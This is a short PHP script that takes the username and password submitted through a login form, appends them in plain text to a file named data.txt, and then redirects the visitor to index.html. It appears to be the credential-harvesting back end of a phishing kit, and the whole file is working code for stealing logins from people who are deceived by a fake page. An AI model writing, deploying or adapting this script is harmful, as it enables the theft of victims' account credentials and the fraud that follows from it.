<?php

$file = 'data.txt';

if(isset($_POST['uname']))
{
  $type = "\r\nlogin ID : ".$_POST['uname'];
  $text = $type."\r\n";
  file_put_contents($file, $text, FILE_APPEND);
}

if(isset($_POST['psw']))
{
  $type = "Password :".$_POST['psw'];
  $text = $type."\r\n";
  file_put_contents($file, $text, FILE_APPEND);
}

header('location: index.html');

?>
